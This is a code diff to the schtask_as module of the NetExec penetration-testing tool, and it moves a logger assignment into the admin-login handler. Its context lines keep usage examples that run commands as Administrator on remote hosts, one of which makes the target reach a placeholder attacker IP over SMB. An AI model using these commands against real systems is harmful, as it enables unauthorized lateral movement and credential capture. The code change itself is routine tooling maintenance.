@@ -44,7 +44,6 @@ class NXCModule:
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\<attacker-ip>\pwn' TASK='Legit Task' SILENTCOMMAND='True'
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=certreq CA='ADCS\whiteflag-ADCS-CA' TEMPLATE=User
         """
-        self.logger = context.log
         self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = self.ca_name = self.template_name = None
         self.share = "C$"
         self.output_file_location = "\\Windows\\Temp"
@@ -71,6 +70,7 @@ class NXCModule:
         self.template_name = module_options.get("TEMPLATE")
 
     def on_admin_login(self, context, connection):
+        self.logger = context.log
 
         if self.command_to_run is None:
             self.logger.fail("You need to specify a CMD to run")
